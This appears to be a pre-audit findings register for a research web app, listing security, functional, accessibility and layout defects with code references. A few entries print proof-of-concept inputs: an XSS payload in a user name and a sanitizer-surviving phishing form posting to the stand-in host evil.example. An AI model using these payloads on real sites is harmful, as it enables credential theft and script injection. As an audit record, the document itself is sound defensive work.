# Web UI findings register (pre-audit)

Repo: /home/a/mounts/ubuntu/blackbird-copi-science (sshfs; slow reads — Grep first, then ranged Read).
Status tags: BROWSER = reproduced in headless Chromium against a local instance of the current
code (scratch DB, fake LLM); PROD = observed on https://blackbird.copi.science with a read-only GET/HEAD;
CODE = reviewer traced the code only; PLAUSIBLE = reviewer flagged an unverified link.
Prod library versions (read from the running web container): fastapi 0.142.2, starlette 1.7.0,
jinja2 3.1.6, markupsafe 3.0.3, python-multipart 0.0.32, sqlalchemy 2.1.1, uvicorn 0.54.0
(OSV: 0 advisories for each). CDN: marked 12.0.2 (OSV 0), DOMPurify 3.1.6 (OSV 20; see M-04), d3 7.9.0 (OSV 0).
Prod `.env`: POSTHOG_API_KEY empty; BASE_URL https://blackbird.copi.science.

## Security / authz / data integrity

- A-01 [high] BROWSER. `templates/admin/user_detail.html:177-178` `onsubmit="return confirm('Delete {{ target_user.name }}? ...')"`.
  Autoescaped `'` (&#39;) is decoded before the inline handler runs. Reproduced: user named
  `x'+(window.__xss=1)+'` → admin clicks Delete User, dismisses confirm → `window.__xss==1`.
  Reproduced: user named `Mary O'Brien` → handler SyntaxError → no confirm shown → user deleted
  immediately. Name sources: ORCID name at first login (`src/routers/auth.py`, `src/services/orcid.py`),
  `/profile/save` (`src/services/profile_edit.py`). Same pattern with admin-set names: `admin/cohorts.html:108`, `admin/cohort_detail.html:28`.
- A-02/B-02 [medium] BROWSER (sanitizer behaviour). `static/js/markdown.js:59-69` page renderer =
  `DOMPurify.sanitize(marked.parse(md))` default config. In the page, DOMPurify 3.1.6 default output of
  `<form action="https://evil.example/x"><input name=p><button>Sign in</button></form><img src="https://evil.example/p.png"><div id="m-1" style="position:fixed;inset:0">`
  kept form/action/input/button/img/src/style/id (javascript: href stripped, target stripped).
  Sinks: `data-markdown` in `admin/_assessment_detail_body.html` (134,155,220,499-505,836,1280),
  `admin/_assessments_body.html` (389,474), `admin/_discussions_threads.html:141`,
  `admin/discussions_export.html:40`, `manager/prompt_suggestion_detail.html:68`, `cabo_graph.html` modal.
  Data: LLM/agent transcript text. A same-origin form passes OriginGuard → CSRF from injected content.
- A-03 [medium] CODE+BROWSER. Unversioned Tailwind Play CDN without SRI on every page (`base.html:9`, `cabo_graph.html:10`); Tailwind docs: "designed for development purposes only"; console warns on every page.
- A-04 [medium] CODE (known:2026-09-30/A-invite-email-unverified?). Invite acceptance compares to unverified `users.email` that `/profile/save` can set → accept an invite addressed to someone else.
- A-05 [medium] PLAUSIBLE. Cookie tossing from sibling hosts (`copi.science`, `devel.copi.science`): no `__Host-` prefix; `copi-impersonate` is an unsigned UUID cookie (`src/routers/admin/impersonation.py`, `src/dependencies.py:118-130`).
- A-06 [low→info] PROD: live proxy sends `X-Frame-Options: DENY` and enforced `frame-ancestors 'none'`; app itself sets neither (`src/main.py`). Defence lives only in another deployment's nginx.
- A-07 [low] CODE (known W-admin-access-denial / W-admin-cross-delete?). Deny/delete can remove the last admin.
- A-08 [low] PLAUSIBLE. `agent_page.py:711-779` connect-slack links Slack id by unverified email, no owner/status check.
- A-09 [low] CODE. `invite.py:84-97,159-168` uses raw session user_id, skips access_status check.
- A-10/C-25 [low] CODE. Impersonated writes attributed without impersonation note: profile save/onboarding/access routes/simulation start-stop-finalize/cohort edits.
- A-11 [low] CODE. No session.clear() at login; logout is client-only with 30-day stateless cookie; impersonate cookie not cleared at login.
- A-12 [low, latent] CODE. `base.html:20` PostHog identify with JS-string interpolation of name/email (backslash breaks out); self-only; key empty in prod.
- A-13 [low] CODE. Public graph routes (`public.py:739-858`) expose PI names, proposal summary_text, thread ids unauthenticated.
- A-14/D-13 [low] CODE. Error text passed raw in query strings (`agent_page.py:194,272,776-778,886-888`, `manager.py:199,243-244`): content spoofing; unquoted URL building truncates/mangles messages.
- A-15 [low] PLAUSIBLE. name/institution/department >255 chars → 500.
- A-16 [info] CODE. `/admin/impersonate` creates a pending PI + job for an unknown ORCID.
- A-17 [info] CODE. Grant/industry veto routes lack PI-role target check.
- A-19 [info] CODE. GET routes that write: onboarding enqueue, invite expire, chat stale sweep, Slack callback.
- B-04 [medium] CODE. Review feedback double-submit creates duplicate rows (`assessment_reviews.py:339-360`, no submit guard).
- B-10 [low] CODE. Review delete has no confirm (`_assessment_detail_body.html:1133-1137`).
- B-11 [low] CODE/PLAUSIBLE. Comment silently truncated at 10k; NUL → 500.
- C-04 [medium] CODE. Admin edit dropdown allows active→pending, re-opening slug rename and auto-activation (`admin/_common.py:17`, `agents.py:321-322`).
- C-05 [medium] CODE. Role change route skips activation blockers / second hub (`agents.py:468-494`).
- C-06 [medium] CODE. Link-user: malformed/nonexistent/already-linked user → 500 (`agents.py:461-462`).
- C-07 [medium] CODE. Cohort topology save diffs against current DB, deleting memberships added since render (`cohorts.py:311-353`).
- C-10 [medium] CODE. Finalize run (irreversible Slack announce) has no confirm (`admin/activity_detail.html:26-33`).
- C-24 [low] PLAUSIBLE. Start-resume vs finalize race.
- C-29 [low] CODE. Reject route has no status check — can suspend an active agent (`agents.py:334-350`).
- D-01 [medium] CODE. Manager PI form re-posts unchanged tenure year → overwrites machine-derived source with "manual" (`pi_detail.html:213`, `profile_edit.py:102-108`).
- D-02 [medium] CODE. Partial commit on email error (tenure saved, page says failed) (`profile_edit.py:102-118`, `database.py:101`).
- D-06 [medium] CODE. Reviewer/manager accounts can become delegates and use agent write routes.
- D-07 [medium] PLAUSIBLE. Activate overwrites a concurrent suspend (no status predicate).
- D-08 [medium] PLAUSIBLE. Manager profile save during active generate job → unique violation 500.
- D-15 [low] CODE. Public-profile Save creates an empty profile when none exists.
- D-16 [low] CODE (known 9c2f64f). Comma-split corrupts tags containing commas on any save.
- D-17 [low] CODE. Concurrent Add-PI maps users.orcid unique violation to wrong message.
- D-19 [low] PLAUSIBLE. Grant veto wipes ORCID-sourced grant titles; re-veto overwrites vetoed_at.

## Functional / JS / UX

- C-01 [high] BROWSER. `admin/simulation.html:741-750` 30 s refresh replaces `#sim-body` (incl. Start form) unless focus is in an input. Reproduced: set max_runtime=60, max_proposals=20, click blank space, wait 33 s → values back to 0/0.
- C-02 [high] CODE. Discussions export (attachment) depends on `/static/js/markdown.js`; opened from disk, proposal bodies are blank.
- C-03 [medium] CODE. Slack provisioning error redirect `?slack_error=` never rendered on /admin/agents.
- C-08 [medium] CODE. Refresh fetch has no ok/redirect check or catch; stops silently on 302/500/405 (browser: after cookie removal, page stayed, no injected login form, no notice).
- C-09 [medium] CODE. Refresh steals keyboard focus every 30 s.
- C-14 [medium] PLAUSIBLE. Each 30 s poll re-runs ~20 queries incl. up to 20k call_stats rows.
- C-15/D-25 [medium] CODE. Discussions/PI lists built in Python then sliced; `run_id=all` loads everything.
- C-16 [medium] PLAUSIBLE. llm_calls page inlines full prompts/responses for 50 rows.
- C-18 [low] CODE/PLAUSIBLE. Jobs type filter misses 2 enum values; bad enum param → 500? (browser: `/admin/jobs?status=nonsense` → 200; reviewer said param name is `status_filter`).
- C-19 [low] PLAUSIBLE. runs page param lacks le=MAX_PAGE → bigint overflow 500.
- C-20 [low] CODE. Negative max_runtime accepted → negative progress.
- C-21/C-22/C-23 [low] CODE. Avg latency uses latency_ms; "20,000 calls" copy is rows; hub pick has no ORDER BY.
- C-27 [low] CODE. msg/error query flash persists through refreshes.
- C-30 [info] CODE. `llm_calls.html:36` split('-')[1] unguarded.
- B-01 [high→?] Timeline "Show full message" toggle hidden when measured inside a closed `<details>`. BROWSER (Chromium): after opening the timeline the long message's toggle WAS visible (scrollHeight 2848 vs 256) → refuted in Chromium; Firefox/Safari untested.
- B-03 [medium] CODE. Quick-score redirect anchors to a card filtered out of the Unreviewed tab.
- B-06 [medium] BROWSER. Chat send disables the focused textarea; focus lands on BODY during and after the answer.
- B-07 [medium] PLAUSIBLE. Detail page loads up to 200 messages_json blobs per view.
- B-08 [low] CODE. Chat history poll every 5 s runs sweep UPDATE + full detail build.
- B-09 [low] CODE. "Read-only view." copy above working write forms (manager detail).
- B-13 [low] CODE. Unknown run_id UUID shows empty list with wrong selected option.
- B-16/B-17/B-20 [low] CODE. Drawer modal state not re-evaluated on resize; poll re-render scrolls to bottom and drops focus; show-in-page target under drawer.
- B-18 [low] PLAUSIBLE. lab filter not URL-encoded in tab links.
- D-03 [medium] CODE. `slack_error` passed to dashboard.html but never rendered.
- D-04 [medium] CODE. `_user_slack_id_in_list` always False → stale "connect" banner.
- D-05 [medium] CODE. Dashboard does sequential Slack users.info per legacy delegate on every view.
- D-09/D-10 [low] CODE. `saved=1`, `no_agent`, `slack_ok` never rendered.
- D-11 [low] CODE. Two different "has token" predicates (manager slack bots vs pi detail/activate).
- D-12 [low] CODE. Prompt suggestion detail shows status buttons under impersonation → 403.
- D-14 [low] CODE. Conversations thread fetch injects the login page on session expiry; aria-expanded stale on error.
- D-18 [low] CODE. ORCID input rejects lowercase x / orcid.org URL.
- D-20/D-21/D-26/D-27/D-28 [low/info] CODE. Listing loops; ignored email send result; no pager beyond 50 roots; run pager hidden past end; stale "Scripps"/"admin will provision" copy.
- M-01 [low-medium] BROWSER. Every 403/404/422 reached by navigation is raw JSON (`{"detail":"Admin access required"}`), no HTML error page or nav (208 of 208 403s in crawl were application/json).
- M-02 [low] PROD. `HEAD /login` → 405 (FastAPI GET routes do not answer HEAD); breaks HEAD-based uptime checks/link checkers.
- M-03 [low-medium] PROD. Live proxy CSP for script/style/connect/form-action is Report-Only, `report-uri /api/csp-report` → 404 on prod (no such route); so no enforced script CSP on base.html pages and violation reports are lost. Report-only `connect-src` allows us.i.posthog.com but the snippet posts to `/ingest`, which 404s on prod (latent; key empty).
- M-04 [low] OSV. DOMPurify 3.1.6: 20 advisories (latest 3.4.16). Configs in use: default (markdown.js) and ALLOWED_TAGS/ALLOWED_ATTR/ALLOWED_URI_REGEXP (assessment_chat.js:55-64); no SAFE_FOR_TEMPLATES/IN_PLACE/RETURN_DOM/ADD_*/hooks/USE_PROFILES/CUSTOM_ELEMENT_HANDLING; no rawtext re-wrapping found in static/js. So no listed advisory applies as used; hygiene only. marked 12.0.2: 0 advisories (latest 18.0.14).
- M-05 [low] CODE. Graph CSP (`public.py:28-50`) allows any script from https://cdn.jsdelivr.net plus 'unsafe-eval', no form-action.
- M-08 [low] BROWSER. Manager GET /profile, /profile/edit, /agent render PI-only pages whose POSTs 403 (reviewer is redirected instead).

## Accessibility (axe-core 4.13.0, WCAG 2.0/2.1/2.2 A+AA + best-practice; 1280px; roles anon/admin/manager/reviewer/pi)

- X-01 [serious] color-contrast: 965 nodes on 40 pages (e.g. `text-gray-400` 2.42:1 on gray-50; login ORCID button white on green-600 3.29:1). = B-05, C-26.
- X-02 [critical] select-name 42 nodes/12 pages; label 38 nodes/4 pages (profile/edit, public-profile/edit, manager PI detail, simulation); label-title-only (discussions). = C-12, D-23, A-18 (impersonate input).
- X-03 [serious] link-in-text-block: login, cohorts, topology, simulation, slack-bots (indigo-500 links 1.75:1 vs surrounding text, no underline).
- X-04 [moderate] region (sub-navs outside landmarks, 28 pages), landmark-unique (two unnamed <nav> on detail pages), heading-order (agent detail), page-has-heading-one (login, graph pages), landmark-one-main (graph pages); empty-table-header (access requests).
- X-05 Keyboard (BROWSER): Tab through /admin/activity reaches only nav links then cycles; run rows (`<tr onclick>`) are unreachable. = C-11, D-22, A-18.
- X-06 Colour-only signals: gantt announced state (C-13); emoji glyph `aria-label` on generic span (B-12); orphan label for dimension selects (B-21).

## Responsive (BROWSER, 375px; document horizontal overflow)

- R-01 Assessments list filter form +174px (admin & manager lists, all roles); discussions filters +259px (admin) / +96px (manager); simulation tables +223px; jobs +11px; agents +5px; prompt-suggestions +119px. = C-17, D-24, B-14.
- R-02 Long unbroken strings (300-char URL in seeded data) overflow: profile view (+2770 at 375, +2041 at 1280), profile edit & public-profile tag pills, admin user detail & manager PI detail (+1653 at 1280), assessment detail headline/key points (+4008 at 1280), chat answer log (+1239px inside the drawer). = B-15.
- No XSS canary fired in 744 page loads with adversarial seeded names/headlines/summaries/job errors; no uncaught page errors; chat sanitizer stripped img/javascript:/raw HTML from a streamed adversarial answer; chat shows "Your session has ended — reload the page." after cookie removal.
